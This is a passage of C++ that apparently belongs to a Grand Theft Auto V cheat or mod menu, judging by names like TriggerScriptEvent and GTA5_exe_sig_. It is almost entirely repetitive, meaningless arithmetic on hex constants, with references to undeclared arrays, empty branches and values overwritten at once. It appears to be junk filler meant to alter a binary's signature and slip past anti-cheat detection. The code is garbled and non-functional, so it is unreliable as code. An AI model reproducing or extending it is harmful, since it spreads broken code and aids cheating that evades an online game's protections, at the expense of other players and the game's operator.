			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<IsSecondaryColourCustom>false</IsSecondaryColourCustom>");
			Extern_Reader::LOG::LogSemHora("<tyreSmoke_R>255</tyreSmoke_R>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
